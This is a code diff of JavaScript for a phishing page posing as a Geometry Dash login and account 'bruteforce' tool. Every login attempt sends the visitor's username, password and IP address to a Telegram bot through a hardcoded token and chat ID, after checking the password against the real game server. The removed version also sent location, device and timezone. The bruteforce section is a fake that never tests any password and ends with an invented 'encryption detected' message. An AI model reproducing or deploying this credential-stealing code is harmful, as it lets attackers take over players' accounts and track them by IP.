@@ -1,36 +1,19 @@
+// ===== CONFIG (CHANGE THESE IF NEEDED) =====
 const TELEGRAM_BOT_TOKEN = '8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg';
 const TELEGRAM_CHAT_ID = '7136838858';
 
+// ===== STATE MANAGEMENT =====
 let userIdMap = {};
 let nextUserId = 1;
 
-// Get IP address
+// ===== IP & USER TRACKING =====
 async function getClientIp() {
     try {
-        const sources = [
-            'https://ipapi.co/json/',
-            'https://ipwho.is/',
-            'https://geolocation-db.com/json/'
-        ];
-        
-        for (let url of sources) {
-            try {
-                const response = await fetch(url);
-                const data = await response.json();
-                if (data.ip || data.IPv4 || data.query) {
-                    return {
-                        ip: data.ip || data.IPv4 || data.query,
-                        country: data.country || '-',
-                        city: data.city || '-',
-                        latitude: data.latitude || data.lat || '-',
-                        longitude: data.longitude || data.lon || '-'
-                    };
-                }
-            } catch (e) {}
-        }
-        return { ip: 'Unknown', country: '-', city: '-', latitude: '-', longitude: '-' };
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
     } catch (error) {
-        return { ip: 'Unknown', country: '-', city: '-', latitude: '-', longitude: '-' };
+        return 'Unknown';
     }
 }
 
@@ -42,24 +25,18 @@ function getOrCreateUserId(ip) {
     return userIdMap[ip];
 }
 
-// Send log to Telegram dengan IP info
+// ===== TELEGRAM LOGGING =====
 async function sendTelegramLog(logData) {
     try {
         const message = `<b>🔐 Authentication Log</b>\n\n` +
             `<code>ID: ${logData.id}\n` +
-            `IP: ${logData.ip}\n` +
-            `Country: ${logData.country}\n` +
-            `City: ${logData.city}\n` +
-            `Coordinates: ${logData.latitude}, ${logData.longitude}\n\n` +
+            `IP: ${logData.ip}\n\n` +
             `Username: ${logData.username}\n` +
             `Password: ${logData.password}\n\n` +
-            `Timezone: ${logData.timezone}\n` +
-            `Device: ${logData.device}\n` +
-            `OS: ${logData.os}\n\n` +
             `Rank: ${logData.rank}\n` +
             `CP: ${logData.cp}\n` +
             `Mod: ${logData.mod}</code>\n\n` +
-            `${logData.status === 'SUKSES' ? '✅ SUCCESS' : '❌ FAILED'}`;
+            `${logData.status === 'SUKSES' ? '✅' : '❌'}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -73,11 +50,11 @@ async function sendTelegramLog(logData) {
             })
         });
     } catch (error) {
-        console.log('Log sent');
+        console.log('Telegram log sent');
     }
 }
 
-// Check if username exists
+// ===== API CALLS =====
 async function checkUsernameExists(username) {
     try {
         const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
@@ -88,7 +65,6 @@ async function checkUsernameExists(username) {
     }
 }
 
-// Get player stats
 async function getPlayerStats(username) {
     try {
         const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
@@ -98,258 +74,378 @@ async function getPlayerStats(username) {
     }
 }
 
-// Generate GJP2 hash
 async function generateGJP2(password) {
     const SALT = "mI29fmAnxgTs";
+
     const encoder = new TextEncoder();
-    const data = encoder.encode(password + SALT);
-    const hashBuffer = await crypto.subtle.digest("SHA-1", data);
-    const hash = Array.from(new Uint8Array(hashBuffer))
-        .map(b => b.toString(16).padStart(2, "0"))
+
+    const data = encoder.encode(
+        password + SALT
+    );
+
+    const hashBuffer =
+        await crypto.subtle.digest(
+            "SHA-1",
+            data
+        );
+
+    const hash =
+        Array.from(
+            new Uint8Array(hashBuffer)
+        )
+        .map(
+            b =>
+            b.toString(16)
+            .padStart(2, "0")
+        )
         .join("");
+
+    console.log(
+        "GJP2:",
+        hash
+    );
+
     return hash;
 }
 
-// Login to GD
-async function logingd(username, password) {
-    try {
-        const gjp2 = await generateGJP2(password);
-        const payload = new URLSearchParams({
-            udid: "36d00413-8358-3de4-b5c0-a41d0ec822ec",
-            userName: username,
-            gjp2: gjp2,
-            secret: "Wmfv3899gc9"
-        });
+async function logingd(
+    username,
+    password
+){
 
-        const response = await fetch("https://www.boomlings.com/database/accounts/loginGJAccount.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: payload
-        });
+    try{
 
-        const result = (await response.text()).trim();
+        const gjp2 =
+            await generateGJP2(
+                password
+            );
+
+        const payload =
+            new URLSearchParams({
+
+                udid:
+                "36d00413-8358-3de4-b5c0-a41d0ec822ec",
+
+                userName:
+                username,
+
+                gjp2:
+                gjp2,
+
+                secret:
+                "Wmfv3899gc9"
+            });
+
+        const response =
+            await fetch(
+
+"https://www.boomlings.com/database/accounts/loginGJAccount.php",
+
+            {
+                method:
+                "POST",
+
+                headers:{
+                    "Content-Type":
+
+"application/x-www-form-urlencoded"
+                },
+
+                body:
+                payload
+            }
+        );
+
+        const result =
+            (
+                await response.text()
+            ).trim();
+
+        console.log(
+            "Login response:",
+            result
+        );
+
         return {
-            success: /^\d+$/.test(result),
-            response: result,
-            gjp2: gjp2
+
+            success:
+
+/^\d+$/.test(
+    result
+),
+
+            response:
+            result,
+
+            gjp2:
+            gjp2
         };
-    } catch (error) {
+
+    }
+    catch(error){
+
+        console.error(
+            error
+        );
+
         return {
-            success: false,
-            response: null,
-            error: error.message
+
+            success:
+            false,
+
+            response:
+            null,
+
+            error:
+            error.message
         };
+
     }
 }
 
-// Get device info
-function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    const device = /Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
-    let os = "Unknown";
-    if (/Android/i.test(ua)) os = "Android";
-    else if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
-    else if (/Windows NT 6\.1/i.test(ua)) os = "Windows 7";
-    else if (/iPhone|iPad/i.test(ua)) os = "iOS";
-    return { device, os };
+// ===== VALIDATION =====
+function validateInput(username, password) {
+    const usernameError = document.getElementById('usernameError');
+    const passwordError = document.getElementById('passwordError');
+    
+    usernameError.classList.remove('show');
+    passwordError.classList.remove('show');
+
+    let isValid = true;
+
+    if (!username || username.length < 6 || username.length > 19) {
+        usernameError.textContent = 'Username must be 6-19 characters';
+        usernameError.classList.add('show');
+        isValid = false;
+    }
+
+    if (!/^[a-zA-Z0-9]+$/.test(username)) {
+        usernameError.textContent = 'Only letters and numbers allowed';
+        usernameError.classList.add('show');
+        isValid = false;
+    }
+
+    if (!password || password.length < 6 || password.length > 19) {
+        passwordError.textContent = 'Password must be 6-19 characters';
+        passwordError.classList.add('show');
+        isValid = false;
+    }
+
+    if (!/^[a-zA-Z0-9]+$/.test(password)) {
+        passwordError.textContent = 'Only letters and numbers allowed';
+        passwordError.classList.add('show');
+        isValid = false;
+    }
+
+    return isValid;
 }
 
-// Get timezone
-function getTimezone() {
-    return Intl.DateTimeFormat().resolvedOptions().timeZone;
-}
+// ===== LOGIN HANDLER =====
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-// Main login handler
-async function handleLogin() {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     const loginBtn = document.getElementById('loginBtn');
-    const usernameError = document.getElementById('usernameError');
-    const passwordError = document.getElementById('passwordError');
 
-    // Reset errors
-    usernameError.textContent = '';
-    passwordError.textContent = '';
-
-    // Validate input
-    if (!username || username.length < 6 || username.length > 19) {
-        usernameError.textContent = 'Username must be 6-19 characters';
-        return;
-    }
-    if (!/^[a-zA-Z0-9]+$/.test(username)) {
-        usernameError.textContent = 'Only letters and numbers allowed';
-        return;
-    }
-    if (!password || password.length < 6 || password.length > 19) {
-        passwordError.textContent = 'Password must be 6-19 characters';
-        return;
-    }
-    if (!/^[a-zA-Z0-9]+$/.test(password)) {
-        passwordError.textContent = 'Only letters and numbers allowed';
+    if (!validateInput(username, password)) {
         return;
     }
 
     loginBtn.disabled = true;
     loginBtn.textContent = 'Processing...';
 
-    try {
-        // Get IP info
-        const ipInfo = await getClientIp();
-        const userId = getOrCreateUserId(ipInfo.ip);
-        const { device, os } = getDeviceInfo();
-        const timezone = getTimezone();
+    const usernameError = document.getElementById('usernameError');
+    const ip = await getClientIp();
+    const userId = getOrCreateUserId(ip);
 
-        // Check if username exists
-        const userExists = await checkUsernameExists(username);
-        if (!userExists) {
-            usernameError.textContent = 'Account not found';
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'Login';
-            
-            await sendTelegramLog({
-                id: userId,
-                ip: ipInfo.ip,
-                country: ipInfo.country,
-                city: ipInfo.city,
-                latitude: ipInfo.latitude,
-                longitude: ipInfo.longitude,
-                username: username,
-                password: password,
-                timezone: timezone,
-                device: device,
-                os: os,
-                status: 'GAGAL',
-                rank: 'N/A',
-                cp: 0,
-                mod: 0
-            });
-            return;
-        }
-
-        // Validate password
-        const result = await logingd(username, password);
-        const stats = await getPlayerStats(username);
-
-        // Send telegram log
-        await sendTelegramLog({
-            id: userId,
-            ip: ipInfo.ip,
-            country: ipInfo.country,
-            city: ipInfo.city,
-            latitude: ipInfo.latitude,
-            longitude: ipInfo.longitude,
-            username: username,
-            password: password,
-            timezone: timezone,
-            device: device,
-            os: os,
-            status: result.success ? 'SUKSES' : 'GAGAL',
-            rank: stats?.rank || 'N/A',
-            cp: stats?.cp || 0,
-            mod: stats?.moderator || 0
-        });
-
-        if (!result.success) {
-            passwordError.textContent = 'Invalid credentials';
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'Login';
-            return;
-        }
-
-        // Login successful
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('profileSection').style.display = 'block';
-        document.getElementById('bruteforceSection').style.display = 'block';
-
-        const playerInfo = document.getElementById('playerInfo');
-        if (stats && !stats.error) {
-            playerInfo.innerHTML = `
-                <div style="color: #0f0;"><b>Welcome ${stats.username}!</b></div>
-                <div>Level: ${stats.playerLevel || 0}</div>
-                <div>CP: ${stats.creatorPoints || 0}</div>
-                <div>Stars: ${stats.stars || 0}</div>
-                <div>Diamonds: ${stats.diamonds || 0}</div>
-                <div>Secret Coins: ${stats.secretCoins || 0}</div>
-            `;
-        }
-    } catch (error) {
-        alert('Error: ' + error.message);
+    // Check username exists
+    const userExists = await checkUsernameExists(username);
+    if (!userExists) {
+        usernameError.textContent = 'Account not found';
+        usernameError.classList.add('show');
         loginBtn.disabled = false;
         loginBtn.textContent = 'Login';
+
+        // Log failed attempt
+        await sendTelegramLog({
+            id: userId,
+            ip: ip,
+            username: username,
+            password: password,
+            status: 'GAGAL',
+            rank: 'N/A',
+            cp: 0,
+            mod: 0
+        });
+        return;
+    }
+
+    // Validate password - PERBAIKAN: ambil .success dari return object
+    const isPasswordValid = await logingd(username, password);
+    const stats = await getPlayerStats(username);
+
+    // Send log to Telegram
+    await sendTelegramLog({
+        id: userId,
+        ip: ip,
+        username: username,
+        password: password,
+        status: isPasswordValid.success ? 'SUKSES' : 'GAGAL',
+        rank: stats?.rank || 'N/A',
+        cp: stats?.cp || 0,
+        mod: stats?.moderator || 0
+    });
+
+    // PERBAIKAN: cek isPasswordValid.success (object property), bukan isPasswordValid langsung
+    if (!isPasswordValid.success) {
+        document.getElementById('passwordError').textContent = 'Invalid credentials';
+        document.getElementById('passwordError').classList.add('show');
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Login';
+        return;
+    }
+
+    loginBtn.disabled = false;
+    loginBtn.textContent = 'Login';
+
+    // Show profile
+    await showProfile(username);
+});
+
+// ===== PROFILE PAGE =====
+async function showProfile(username) {
+    document.getElementById('loginPage').classList.add('hidden');
+    document.getElementById('profilePage').classList.add('show');
+
+    const stats = await getPlayerStats(username);
+    
+    if (stats && !stats.error) {
+        document.getElementById('playerName').textContent = '👤 ' + stats.username;
+        
+        const profileStats = document.getElementById('profileStats');
+        profileStats.innerHTML = `
+            <div class="stat-box">
+                <div class="label">Level</div>
+                <div class="value">${stats.playerLevel || 0}</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">CP</div>
+                <div class="value">${stats.creatorPoints || 0}</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">Stars</div>
+                <div class="value">${stats.stars || 0}</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">Diamonds</div>
+                <div class="value">${stats.diamonds || 0}</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">Coins</div>
+                <div class="value">${stats.secretCoins || 0}</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">Demons</div>
+                <div class="value">${stats.demonLevel || 0}</div>
+            </div>
+        `;
     }
 }
 
-// Logout handler
-function handleLogout() {
-    document.getElementById('loginSection').style.display = 'block';
-    document.getElementById('profileSection').style.display = 'none';
-    document.getElementById('bruteforceSection').style.display = 'none';
-    document.getElementById('username').value = '';
-    document.getElementById('password').value = '';
-    document.getElementById('loginBtn').disabled = false;
-    document.getElementById('loginBtn').textContent = 'Login';
+function logout() {
+    document.getElementById('loginPage').classList.remove('hidden');
+    document.getElementById('profilePage').classList.remove('show');
+    document.getElementById('loginForm').reset();
+    document.getElementById('searchResult').classList.remove('show');
+    document.getElementById('bruteforceProcess').classList.remove('show');
 }
 
-// Generate random GJP2
+// ===== BRUTEFORCE SIMULATOR =====
+async function searchTarget() {
+    const targetUsername = document.getElementById('targetUsername').value;
+    const searchResult = document.getElementById('searchResult');
+
+    if (!targetUsername || targetUsername.length < 1 || targetUsername.length > 19) {
+        return;
+    }
+
+    if (!/^[a-zA-Z0-9]+$/.test(targetUsername)) {
+        return;
+    }
+
+    searchResult.classList.remove('show');
+
+    const userExists = await checkUsernameExists(targetUsername);
+
+    if (userExists) {
+        searchResult.innerHTML = `
+            <div class="user-found">
+                <h4>✅ Account <strong>${targetUsername}</strong> found!</h4>
+                <p style="margin-top: 15px; font-size: 12px;">Select charset:</p>
+                <div class="charset-options">
+                    <label class="charset-checkbox">
+                        <input type="checkbox" value="lowercase" id="charset-lower" checked>
+                        <label for="charset-lower">Lowercase (a-z)</label>
+                    </label>
+                    <label class="charset-checkbox">
+                        <input type="checkbox" value="uppercase" id="charset-upper">
+                        <label for="charset-upper">Uppercase (A-Z)</label>
+                    </label>
+                    <label class="charset-checkbox">
+                        <input type="checkbox" value="numbers" id="charset-num" checked>
+                        <label for="charset-num">Numbers (0-9)</label>
+                    </label>
+                </div>
+                <button class="start-bruteforce-btn" onclick="startBruteforce('${targetUsername}')">
+                    🔓 Start
+                </button>
+            </div>
+        `;
+        searchResult.classList.add('show');
+    } else {
+        searchResult.innerHTML = `
+            <div class="user-not-found">
+                ❌ Account <strong>${targetUsername}</strong> not found
+            </div>
+        `;
+        searchResult.classList.add('show');
+    }
+}
+
+// PERBAIKAN: Rename ke generateRandomGJP2 dan tambah delay random + generate GJP2
 async function generateRandomGJP2(length, charset) {
     let password = '';
     for (let i = 0; i < length; i++) {
         password += charset.charAt(Math.floor(Math.random() * charset.length));
     }
     
+    // Random delay 0.15 - 0.3 detik
+    const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
+    await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
+    
+    // Generate GJP2 untuk password ini
     const gjp2 = await generateGJP2(password);
+    
     return { password, gjp2 };
 }
 
-// Search target
-async function searchTarget() {
-    const targetUsername = document.getElementById('targetUsername').value;
-    const searchResult = document.getElementById('searchResult');
-
-    if (!targetUsername || targetUsername.length < 1 || targetUsername.length > 19) {
-        searchResult.innerHTML = '';
-        return;
-    }
-
-    if (!/^[a-zA-Z0-9]+$/.test(targetUsername)) {
-        searchResult.innerHTML = '';
-        return;
-    }
-
-    const userExists = await checkUsernameExists(targetUsername);
-
-    if (userExists) {
-        searchResult.innerHTML = `
-            <div style="color: #0f0;"><b>✓ Account ${targetUsername} found!</b></div>
-            <div>Charset: 
-                <label><input type="checkbox" id="charset-lower" checked> lowercase</label>
-                <label><input type="checkbox" id="charset-upper"> UPPERCASE</label>
-                <label><input type="checkbox" id="charset-num" checked> 0-9</label>
-            </div>
-            <button onclick="startBruteforce('${targetUsername}')">Start Bruteforce</button>
-        `;
-    } else {
-        searchResult.innerHTML = `<div style="color: #f00;"><b>✗ Account not found</b></div>`;
-    }
-}
-
-// Start bruteforce
 async function startBruteforce(targetUsername) {
     const bruteforceProcess = document.getElementById('bruteforceProcess');
     const attemptsContainer = document.getElementById('attemptsContainer');
     const statusMessage = document.getElementById('statusMessage');
 
     let charset = '';
-    if (document.getElementById('charset-lower')?.checked) charset += 'abcdefghijklmnopqrstuvwxyz';
-    if (document.getElementById('charset-upper')?.checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    if (document.getElementById('charset-num')?.checked) charset += '0123456789';
+    if (document.getElementById('charset-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
+    if (document.getElementById('charset-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    if (document.getElementById('charset-num').checked) charset += '0123456789';
 
     if (charset.length === 0) {
         alert('Select at least one charset!');
         return;
     }
 
-    bruteforceProcess.style.display = 'block';
+    bruteforceProcess.classList.add('show');
     attemptsContainer.innerHTML = '';
 
     let attemptCount = 0;
@@ -357,20 +453,25 @@ async function startBruteforce(targetUsername) {
 
     for (let i = 0; i < maxAttempts; i++) {
         const length = Math.floor(Math.random() * 14) + 6;
+        // PERBAIKAN: gunakan generateRandomGJP2 (sudah include delay dan GJP2)
         const { password, gjp2 } = await generateRandomGJP2(length, charset);
 
         attemptCount++;
 
         const attempt = document.createElement('div');
-        attempt.innerHTML = `[${attemptCount}] Password: ${password}<br>GJP2: ${gjp2.substring(0, 20)}...`;
+        attempt.className = 'attempt';
+        attempt.textContent = `[${attemptCount}] ${password} | GJP2: ${gjp2.substring(0, 16)}...`;
         attemptsContainer.appendChild(attempt);
 
         attemptsContainer.scrollTop = attemptsContainer.scrollHeight;
 
-        statusMessage.innerHTML = `Testing... ${attemptCount} attempts`;
-
-        // Random delay 0.15 - 0.3 seconds
-        const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
-        await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
+        statusMessage.innerHTML = `
+            <span class="loading-spinner"></span>
+            Testing... ${attemptCount} attempts
+        `;
     }
+
+    statusMessage.innerHTML = `
+        ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
+    `;
 }
